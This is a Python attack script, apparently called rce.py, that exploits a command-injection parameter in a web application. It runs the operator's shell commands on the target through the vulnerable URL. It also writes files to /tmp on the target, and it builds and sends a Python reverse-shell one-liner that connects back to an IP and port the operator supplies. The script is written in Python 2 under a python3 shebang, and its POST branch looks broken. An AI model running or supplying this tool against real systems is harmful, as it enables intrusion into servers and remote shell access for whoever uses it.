#!/usr/bin/env python3
#
# Remote Code Execution
#

import sys, urllib, re, urlparse
import getopt, readline

# Overload the user agent
class AppURLopener(urllib.FancyURLopener):
    version = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0"

def usage():
  print """
rce.py - Remote Code Execution

Usage:
  ./rce.py [options] ur<rce>l
Options:
  -p     - Use POST method instead of GET. Enter url as GET.
  -u     - Overload user agent.
  -i <r> - Use regex for the output.
  -r <f> - Upload the file.
  -h     - Help. This menu.
  <rce>  - Location of vulnerable parameter.   
Example:
  ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload.
  ./rce.py -u 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload and overwrite the user agent.
  ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Parses the parameters from the url and sends the attack as a POST request, replacing '<rce>' with the payl
oad.
  ./rce.py -i '<toto>(.*)</toto>' 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Display only the result between the balises 'toto'.
  """
  sys.exit()


def exec_cmd(cmd, base_url, post):
  url = base_url.replace('<rce>', cmd)
  if post:
    (ignore, ignore, ignore, params, ignore) = urlparse.urlsplit(url)
    site = url[:url.find(params)-1]
    result = urllib.urlopen(site, urllib.urlencode(params)).read()
  else:
    result = urllib.urlopen(url).read()

  return result


def reverse_shell(shell, ip, port, base_url, post):
  cmd = ""
  if shell == "python":
    cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("
    cmd += '"' + ip + '"'
    cmd += "," + port
    cmd += "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
    cmd += """p=subprocess.call(["/bin/sh","-i"]);'"""
  else:
    print "Unknown shell '%s'" % shell
    return

  print cmd

  exec_cmd(cmd, base_url, post)


def upload_file(f, base_url, post):
  out = "/tmp/up"
  file = open(f, 'r')
  for line in file:
    cmd = "echo -n '" + line + "' >> " + out
    exec_cmd(cmd, base_url, post)
  file.close()
  print "File uploaded to " + out


# Common init
base_url = ''
post = False
regex = None
upload = None


try:
    opts, args = getopt.getopt(sys.argv[1:], "hpui:r:")
except getopt.GetoptError as err:
    print str(err)
    sys.exit()

for o,a in opts:
    if o in ("-h"):
      usage()
    elif o in ("-p"):
      post = True
    elif o in ("-u"):
        urllib._urlopener = AppURLopener()
    elif o in ("-i"):
        #regex = re.escape(a)
        regex = a
    elif o in ("-r"):
        upload = a

if len(args) != 1 :
  print "No URL provided"
  sys.exit()

if args[0].find('://') == -1:
  print "Not a valid URL"
  sys.exit()

base_url = args[0]

if upload:
  upload_file(upload, base_url, post)
  sys.exit()

readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi') 

# Let's root it
print "Type 'exit' to quit."
print "Type 'rshell' to get a reverse shell."

while True:
  cmd = raw_input("cmd> ")

  if cmd.lower() == 'exit':
    sys.exit(2)
  elif cmd.lower() == 'rshell':
    shell = raw_input("python ")
    ip = raw_input("ip ");
    port = raw_input("port ");
    reverse_shell(shell, ip, port, base_url, post)
    continue

  result =  exec_cmd(cmd, base_url, post)

  if regex:
    m = re.search(regex, result, re.DOTALL|re.MULTILINE)
    if m and m.group(1):
      result = m.group(1)
  else:
      result = re.sub("<\/*\w+?>", '', result) 
  print result
